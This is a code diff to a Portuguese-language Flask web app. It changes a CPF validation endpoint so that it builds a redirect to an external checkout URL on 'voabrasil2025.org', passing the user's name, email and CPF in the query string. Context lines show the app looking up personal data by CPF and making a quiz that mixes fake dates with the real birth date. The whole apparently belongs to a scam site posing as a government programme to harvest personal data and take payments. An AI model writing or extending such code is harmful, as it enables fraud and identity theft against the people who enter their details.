@@ -233,7 +233,8 @@ def formulario_inscricao():
 
 @app.route('/validar-cpf', methods=['POST'])
 def validar_cpf():
-    """Validate CPF and get user data from API"""
+    """Validate CPF and redirect to payment"""
+    CHECKOUT_URL = "https://pay.voabrasil2025.org/rn4RgQ6aVAA3wBV"
     import requests
     import random
     from datetime import datetime, timedelta
@@ -321,8 +322,12 @@ def validar_cpf():
         quiz_datas = random.sample(datas_falsas, 2) + [data_nascimento]
         random.shuffle(quiz_datas)
         
+        # Build payment URL with parameters
+        payment_url = f"{CHECKOUT_URL}?nome={request.json.get('nome')}&email={request.json.get('email')}&cpf={cpf}"
+        
         return jsonify({
             'sucesso': True,
+            'redirect_url': payment_url,
             'primeiro_nome': primeiro_nome,
             'dados_originais': {
                 'nome': nome_completo,
